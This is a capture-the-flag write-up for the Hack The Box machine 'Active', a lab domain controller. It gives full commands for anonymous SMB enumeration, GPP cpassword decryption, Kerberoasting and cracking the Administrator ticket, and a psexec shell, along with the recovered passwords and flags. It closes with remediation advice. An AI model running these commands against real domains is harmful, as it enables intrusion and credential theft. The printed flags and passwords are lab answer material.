---
title: "HTB: Active"
date: 2021-07-02 06:04:00 +0400
last_modified_at: 2026-11-03 10:00:00 +0400
categories: [Writeups, HTB]
tags: [active-directory, kerberoasting, gpp-cpassword, smb, windows]
difficulty: Easy
os: Windows
ip: 10.10.10.100
description: "GPP cpassword in an anonymous SMB share, then kerberoast the Administrator SPN."
---

{% include term-boot.html %}

> **Attack chain** · Anonymous SMB → GPP `cpassword` → `svc_tgs` →
> Kerberoast Administrator SPN → RC4 crack → Domain Admin.
{: .prompt-tip }

## Machine info

| OS | Difficulty | IP | Role |
|---|---|---|---|
| Windows Server 2008 R2 | Easy | 10.10.10.100 | Domain Controller |

## 1. Reconnaissance

Standard nmap. The port set — 88, 389, 445, 636, 3268 — gives it away as
a Domain Controller, and the server banner nails the OS version down to
the patch level.

```terminal
# prompt: m
# cwd: ~/htb/active
$ nmap -sC -sV -Pn -oA active 10.10.10.100
---
Starting Nmap 7.94 at 2026-11-03 09:22 +04
Nmap scan report for 10.10.10.100
Host is up (0.042s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows AD LDAP (Domain: active.htb)
445/tcp   open   microsoft-ds  Windows Server 2008 R2 SP1
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows AD LDAP
49152-8   open   msrpc         Microsoft Windows RPC

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Nmap done: 1 IP address (1 host up) scanned in 8.42s
```

## 2. SMB share enumeration

Null session accepted — the `Replication` share has no ACL at all.

```terminal
# prompt: m
# cwd: ~/htb/active
$ smbclient -L //10.10.10.100 -N -U ''
---
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    Replication     Disk      ◀ anonymous read
    SYSVOL          Disk      Logon server share
    Users           Disk
```

```bash
smbclient //10.10.10.100/Replication -N -U ''
# smb:\> recurse ON
# smb:\> prompt OFF
# smb:\> mget *
```

The dump contains the full `active.htb` SYSVOL replica — Group Policy
Preferences and all.

## 3. GPP cpassword

MS14-025 lives on. Any domain user (null session counts here) could
decrypt the `cpassword` field in `Groups.xml` because Microsoft published
the AES key.

```bash
grep -iR cpassword active.htb/
```

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:
<Properties action="U" ... cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" userName="active.htb\SVC_TGS"/>
```

```terminal
# prompt: m
# cwd: ~/htb/active
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
---
GPPstillStandingStrong2k18
```

Credentials: `active.htb\svc_tgs:GPPstillStandingStrong2k18`.

## 4. Kerberoast → Administrator

`svc_tgs` is unremarkable — a regular domain user. But Administrator
*itself* is registered as an SPN on this box, so any domain user can
request its service ticket.

```terminal
# prompt: m
# cwd: ~/htb/active
$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs:'GPPstillStandingStrong2k18' -outputfile admin-tgs.hash
---
Impacket v0.12.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                   Delegation
--------------------  -------------  ---------------------------------------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb

[*] Writing output to admin-tgs.hash
$ hashcat -m 13100 admin-tgs.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*...9d7c:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$...
```

Administrator password: `Ticketmaster1968`.

## 5. Shell + flags

```bash
impacket-psexec administrator:'Ticketmaster1968'@10.10.10.100
```

```
C:\Users> more svc_tgs\desktop\user.txt
86d67d8ba232bb6a254aa4d10159e983

C:\Users> more administrator\desktop\root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b
```

## Why it worked

- **Replication share had no ACL** — any null session could read SYSVOL replicas offline, bypassing the normal replication SACL.
- **Groups.xml from a 2014-era GPO was never cleaned up** after MS14-025 — the fix removed the ability to *create* new ones, not existing files.
- **Administrator was registered as an SPN** with an RC4-crackable TGS and a dictionary-cracked password.
- **No AES-only Kerberos policy** — the DC still handed out an RC4 (`etype 23`) ticket, which hashcat burns through.

## What to fix

- Audit SYSVOL for `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml` — anything with a `cpassword` attribute. Delete or rewrite the GPO.
- Rotate every password that ever lived in a GPP cpassword field. Assume disclosure.
- Set `msDS-SupportedEncryptionTypes = 24` (AES128 + AES256 only) on service accounts; disable RC4 at the domain level once legacy clients are gone.
- Replace standing service accounts with gMSAs — their 240-char randomised password is not reasonably crackable.
- Deny anonymous SMB (`RestrictNullSessAccess = 1`), require SMB signing.
- Audit which accounts carry SPNs. Administrator should never be one of them.

## Related

- [AD cheat sheet — Kerberoasting]({% post_url 2026-11-03-active-directory-cheatsheet %}#5-kerberos-attacks)
- [AD cheat sheet — GPP decrypt walkthrough]({% post_url 2026-11-03-active-directory-cheatsheet %}#2-unauthenticated-enumeration)
